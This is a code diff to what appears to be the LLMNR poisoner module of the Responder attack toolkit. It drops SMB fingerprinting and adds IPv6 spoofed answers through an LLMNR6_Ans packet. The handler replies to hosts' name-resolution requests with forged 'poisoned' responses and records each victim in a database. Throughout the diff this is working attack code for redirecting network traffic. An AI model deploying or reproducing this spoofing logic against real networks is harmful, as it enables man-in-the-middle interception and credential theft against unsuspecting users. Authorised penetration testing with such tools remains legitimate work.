@@ -14,18 +14,13 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-
-import fingerprint
-from packets import LLMNR_Ans
+from packets import LLMNR_Ans, LLMNR6_Ans
 from utils import *
 
 if (sys.version_info > (3, 0)):
 	from socketserver import BaseRequestHandler
 else:
 	from SocketServer import BaseRequestHandler
-
-
-
 
 def Parse_LLMNR_Name(data):
 	import codecs
@@ -60,14 +55,13 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 		try:
 			data, soc = self.request
 			Name = Parse_LLMNR_Name(data).decode("latin-1")
+			LLMNRType = Parse_IPV6_Addr(data)
+
 			# Break out if we don't want to respond to this host
 			if RespondToThisHost(self.client_address[0], Name) is not True:
 				return None
-			if data[2:4] == b'\x00\x00' and Parse_IPV6_Addr(data):
-				Finger = None
-				if settings.Config.Finger_On_Off:
-					Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))
-	
+			#IPv4
+			if data[2:4] == b'\x00\x00' and LLMNRType:
 				if settings.Config.AnalyzeMode:
 					LineHeader = "[Analyze mode: LLMNR]"
 					print(color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1))
@@ -77,7 +71,8 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 							'ForName': Name,
 							'AnalyzeMode': '1',
 							})
-				else:  # Poisoning Mode
+
+				elif LLMNRType == True:  # Poisoning Mode
 					Buffer1 = LLMNR_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name)
 					Buffer1.calculate()
 					soc.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
@@ -89,8 +84,19 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 							'ForName': Name,
 							'AnalyzeMode': '0',
 							})
-				if Finger is not None:
-					print(text("[FINGER] OS Version     : %s" % color(Finger[0], 3)))
-					print(text("[FINGER] Client Version : %s" % color(Finger[1], 3)))
+	
+				elif LLMNRType == 'IPv6':
+					Buffer1 = LLMNR6_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name)
+					Buffer1.calculate()
+					soc.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
+					LineHeader = "[*] [LLMNR]"
+					print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1))
+					SavePoisonersToDb({
+							'Poisoner': 'LLMNR6', 
+							'SentToIp': self.client_address[0], 
+							'ForName': Name,
+							'AnalyzeMode': '0',
+							})
+
 		except:
 			raise
